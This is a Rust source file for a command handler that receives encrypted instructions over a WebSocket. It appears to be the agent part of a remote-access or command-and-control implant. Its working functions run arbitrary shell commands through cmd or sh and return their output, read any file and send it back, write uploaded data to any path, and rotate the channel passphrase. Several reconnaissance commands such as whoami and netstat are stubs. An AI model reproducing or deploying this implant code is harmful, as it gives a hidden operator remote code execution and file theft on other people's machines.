use std::sync::Arc;
use futures_util::stream::{SplitSink, SplitStream, StreamExt};
use tokio::fs;
use tokio::net::TcpStream;
use tokio::process::Command;
use tokio::sync::Mutex;
use tokio_tungstenite::tungstenite::Message;
use tokio_tungstenite::WebSocketStream;
use crate::communication;
use crate::command::{Command as NodeCommand, Response};
use crate::response_handler;

pub struct RxCommandHandler {
    passphrase: String,
    ws_sender: Option<Arc<Mutex<SplitSink<WebSocketStream<TcpStream>, Message>>>>,
    ws_receiver: Option<Arc<Mutex<SplitStream<WebSocketStream<TcpStream>>>>>,
}

impl RxCommandHandler {
    pub fn new(
        passphrase: String,
        ws_sender: Option<Arc<Mutex<SplitSink<WebSocketStream<TcpStream>, Message>>>>,
        ws_receiver: Option<Arc<Mutex<SplitStream<WebSocketStream<TcpStream>>>>>,
    ) -> Self {
        RxCommandHandler { passphrase, ws_sender, ws_receiver }
    }

    pub async fn handle_command(&mut self, command: NodeCommand) -> Response {
        match command {
            NodeCommand::Echo { message } => self.echo_message(&message).await,
            NodeCommand::Info => self.info().await,
            NodeCommand::Whoami => self.whoami().await,
            NodeCommand::Pwd => self.pwd().await,
            NodeCommand::Users => self.users().await,
            NodeCommand::Netstat => self.netstat().await,
            NodeCommand::Network => self.network().await,
            NodeCommand::ListFiles => self.list_files().await,
            NodeCommand::GetFile { file_path, file_local_path } => self.download_file(&file_path, &file_local_path).await,
            NodeCommand::PutFile { file_path, file_up_path, data } => self.upload_file(&file_path, &file_up_path, &data).await,
            NodeCommand::Execute { command } => self.execute_command(&command).await,
            NodeCommand::ChangePassphrase { new_passphrase } => self.change_passphrase(&new_passphrase).await,
        }
    }
    
    async fn echo_message(&self, message: &str) -> Response {
        println!("{}", message);
        Response::Message { content: format!("[+] {}", message) }
    }

    async fn info(&self) -> Response {
        Response::Message { content: "NOT IMPLEMENTED".to_string() }
    }

    async fn pwd(&self) -> Response {
        Response::Message { content: "NOT IMPLEMENTED".to_string() }
    }

    async fn users(&self) -> Response {
        Response::Message { content: "NOT IMPLEMENTED".to_string() }
    }

    async fn netstat(&self) -> Response {
        Response::Message { content: "NOT IMPLEMENTED".to_string() }
    }

    async fn network(&self) -> Response {
        Response::Message { content: "NOT IMPLEMENTED".to_string() }
    }

    async fn whoami(&self) -> Response {
        Response::Message { content: "NOT IMPLEMENTED".to_string() }
    }


    async fn list_files(&self) -> Response {
        let mut file_list = vec![];

        match fs::read_dir(".").await {
            Ok(mut entries) => {
                while let Ok(Some(entry)) = entries.next_entry().await {
                    if let Some(file_name) = entry.file_name().to_str() {
                        file_list.push(file_name.to_string());
                    }
                }
            }
            Err(e) => {
                eprintln!("Failed to read directory: {}", e);
            }
        }

        Response::FileList { files: file_list }
    }

    async fn download_file(&self, file_path: &str, file_local_path: &str) -> Response {
        match fs::read(file_path).await {
            Ok(file_data) => {
                Response::FileData { file_path: file_local_path.to_string(), data: file_data }
            }
            Err(e) => {
                eprintln!("Failed to read file {}: {}", file_path, e);
                Response::Message { content: format!("Failed to read file: {}", e) }
            }
        }
    }

    async fn upload_file(&self, file_path: &str, file_up_path: &str, data: &[u8]) -> Response {
        match fs::write(file_up_path, data).await {
            Ok(_) => Response::Message { content: format!("File {} uploaded successfully.", file_path) },
            Err(e) => {
                eprintln!("Failed to write file {}: {}", file_up_path, e);
                Response::Message { content: format!("Failed to write file: {}", e) }
            }
        }
    }

    async fn execute_command(&self, command: &str) -> Response {
        let cmd_result = if cfg!(target_os = "windows") {
            Command::new("cmd")
                .args(&["/C", command])
                .output()
                .await
        } else {
            Command::new("sh")
                .arg("-c")
                .arg(command)
                .output()
                .await
        };

        match cmd_result {
            Ok(output) => {
                let result = String::from_utf8_lossy(&output.stdout);
                Response::CommandOutput { output: result.to_string() }
            }
            Err(e) => {
                eprintln!("Failed to execute command: {}", e);
                Response::Message { content: format!("Failed to execute command: {}", e) }
            }
        }
    }

    async fn change_passphrase(&mut self, new_passphrase: &str) -> Response {
        self.passphrase = new_passphrase.to_string();
        Response::Message { content: "Passphrase changed successfully.".to_string() }
    }
    
    async fn send_response(&self, response: Response) {
        if let Some(ws_sender) = &self.ws_sender {
            let mut sender = ws_sender.lock().await;
            let serialized_response = serde_json::to_vec(&response).expect("Failed to serialize response");
            let encrypted_response = communication::prepare_tx(serialized_response, &self.passphrase);
            communication::send_binary_data(&mut sender, encrypted_response).await;
        }
    }

    pub async fn handle_rx(&mut self) {
        while let Some(message) = self.get_next_message().await {
            match message {
                Ok(Message::Binary(data)) => {
                    let decrypted_data = communication::prepare_rx(data, &self.passphrase);
                    
                    if let Ok(command) = serde_json::from_slice::<NodeCommand>(&decrypted_data) {
                        println!("Received command:\n {:?}", command);
                        let response = self.handle_command(command).await;
                        self.send_response(response).await;
                    } else if let Ok(response) = serde_json::from_slice::<Response>(&decrypted_data) {
                        response_handler::process_response(response).await;
                    } else {
                        eprintln!("Received unexpected message format.");
                    }
                }
                Ok(Message::Text(text)) => {
                    eprintln!("Unexpected text message: {}", text);
                }
                Ok(_) => {
                    eprintln!("Received unexpected non-binary message");
                }
                Err(e) => {
                    eprintln!("Error receiving WebSocket message: {}", e);
                    break;
                }
            }
        }
    }
    
    async fn get_next_message(&self) -> Option<Result<Message, tokio_tungstenite::tungstenite::Error>> {
        if let Some(ws_receiver) = &self.ws_receiver {
            let mut receiver = ws_receiver.lock().await;
            receiver.next().await
        } else {
            None
        }
    }
}
